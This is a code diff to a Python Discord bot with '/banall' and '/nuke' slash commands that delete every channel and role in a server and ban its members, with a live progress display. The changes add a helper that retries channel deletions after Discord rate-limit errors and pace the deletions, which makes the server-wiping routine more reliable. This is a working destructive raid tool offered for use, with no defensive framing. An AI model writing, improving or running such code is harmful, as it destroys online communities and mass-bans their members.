@@ -6,6 +6,7 @@ from nextcord.ext import commands
 from nextcord import Interaction
 from nextcord.ui import View
 from flask import Flask
+from nextcord.errors import HTTPException
 
 # ----------------------
 # CONFIG
@@ -89,7 +90,28 @@ class StopView(View):
         )
 
 # ----------------------
-# /BANALL WITH LIVE PROGRESS
+# SAFE CHANNEL DELETE HELPER
+# ----------------------
+async def delete_channel_safe(channel):
+    while True:
+        try:
+            await channel.delete(reason="Nuked")
+            return True
+        except HTTPException as e:
+            if e.status == 429:  # Rate limited
+                retry = getattr(e, "retry_after", 1)
+                print(f"429 hit on {channel.name}, retrying in {retry}s")
+                await asyncio.sleep(retry)
+                continue
+            else:
+                print(f"Failed to delete {channel.name}: {e}")
+                return False
+        except Exception as e:
+            print(f"Unexpected error deleting {channel.name}: {e}")
+            return False
+
+# ----------------------
+# /BANALL COMMAND
 # ----------------------
 @bot.slash_command(description="Ban all members except authorized users")
 async def banall(interaction: Interaction):
@@ -157,7 +179,7 @@ async def banall(interaction: Interaction):
     )
 
 # ----------------------
-# /NUKE WITH LIVE PROGRESS
+# /NUKE COMMAND
 # ----------------------
 @bot.slash_command(description="Delete channels, roles and ban members")
 async def nuke(interaction: Interaction):
@@ -185,6 +207,7 @@ async def nuke(interaction: Interaction):
     view = StopView(interaction.user.id)
 
     ch_done = rl_done = bn_done = 0
+    total_tasks = len(channels) + len(roles) + len(members)
 
     msg = await interaction.followup.send(
         content="💥 **NUKE STARTING...**",
@@ -192,15 +215,18 @@ async def nuke(interaction: Interaction):
         ephemeral=True
     )
 
-    # CHANNELS
+    # ----------------------
+    # DELETE CHANNELS ONE PER SECOND
+    # ----------------------
     for ch in channels:
         if view.stop_requested:
             break
-        try:
-            await ch.delete(reason="Nuked")
-            ch_done += 1
-        except:
-            pass
+
+        deleted = False
+        while not deleted:
+            deleted = await delete_channel_safe(ch)
+
+        ch_done += 1
 
         await msg.edit(
             content=(
@@ -208,13 +234,16 @@ async def nuke(interaction: Interaction):
                 f"🧨 Channels: {ch_done}/{len(channels)}\n"
                 f"🧱 Roles: {rl_done}/{len(roles)}\n"
                 f"🔨 Bans: {bn_done}/{len(members)}\n\n"
-                f"{progress_bar(ch_done + rl_done + bn_done, len(channels)+len(roles)+len(members))}"
+                f"{progress_bar(ch_done + rl_done + bn_done, total_tasks)}"
             ),
             view=view
         )
-        await asyncio.sleep(0.4)
 
-    # ROLES
+        await asyncio.sleep(1.0)  # 1 channel per second
+
+    # ----------------------
+    # DELETE ROLES
+    # ----------------------
     for role in roles:
         if view.stop_requested:
             break
@@ -223,9 +252,21 @@ async def nuke(interaction: Interaction):
             rl_done += 1
         except:
             pass
-        await asyncio.sleep(0.3)
+        await msg.edit(
+            content=(
+                "💥 **NUKE IN PROGRESS**\n"
+                f"🧨 Channels: {ch_done}/{len(channels)}\n"
+                f"🧱 Roles: {rl_done}/{len(roles)}\n"
+                f"🔨 Bans: {bn_done}/{len(members)}\n\n"
+                f"{progress_bar(ch_done + rl_done + bn_done, total_tasks)}"
+            ),
+            view=view
+        )
+        await asyncio.sleep(1.0)
 
-    # BANS
+    # ----------------------
+    # BAN MEMBERS
+    # ----------------------
     for member in members:
         if view.stop_requested:
             break
@@ -234,8 +275,21 @@ async def nuke(interaction: Interaction):
             bn_done += 1
         except:
             pass
+        await msg.edit(
+            content=(
+                "💥 **NUKE IN PROGRESS**\n"
+                f"🧨 Channels: {ch_done}/{len(channels)}\n"
+                f"🧱 Roles: {rl_done}/{len(roles)}\n"
+                f"🔨 Bans: {bn_done}/{len(members)}\n\n"
+                f"{progress_bar(ch_done + rl_done + bn_done, total_tasks)}"
+            ),
+            view=view
+        )
         await asyncio.sleep(1.0)
 
+    # ----------------------
+    # FINAL STATUS
+    # ----------------------
     final_status = "🛑 **NUKE STOPPED**" if view.stop_requested else "💥 **NUKE COMPLETE**"
 
     await msg.edit(
